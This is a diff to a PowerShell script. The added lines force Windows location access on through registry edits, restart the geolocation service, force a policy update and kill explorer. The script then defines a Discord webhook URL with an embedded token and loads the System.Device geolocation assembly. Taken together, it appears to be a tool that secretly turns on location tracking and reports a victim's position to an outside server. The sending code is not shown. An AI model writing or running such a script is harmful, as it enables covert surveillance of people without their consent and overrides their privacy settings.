@@ -1,3 +1,23 @@
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location" -Name "Value" -Value "Allow" -Force
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\AppPrivacy" -Name "LetAppsAccessLocation" -Value 1 -Force
+
+Set-Service -Name "lfsvc" -StartupType Automatic
+
+Start-Sleep -Milliseconds 500
+
+Start-Service -Name "lfsvc"
+
+Stop-Service -Name "lfsvc" -Force -ErrorAction SilentlyContinue
+Start-Service -Name "lfsvc"
+
+gpupdate /force
+
+Stop-Process -Name "explorer" -Force
+
+
+Start-Sleep -Seconds 1
+
+
 $WebhookUrl = "https://discord.com/api/webhooks/1510389267241631754/bsEM-H8cxl_Cu7o8Kj5-rOCXAxzMdme_WKZI2vKN3vDCTMKQo5pxT5MT34YYXInQQlpT"
 
 Add-Type -AssemblyName System.Device
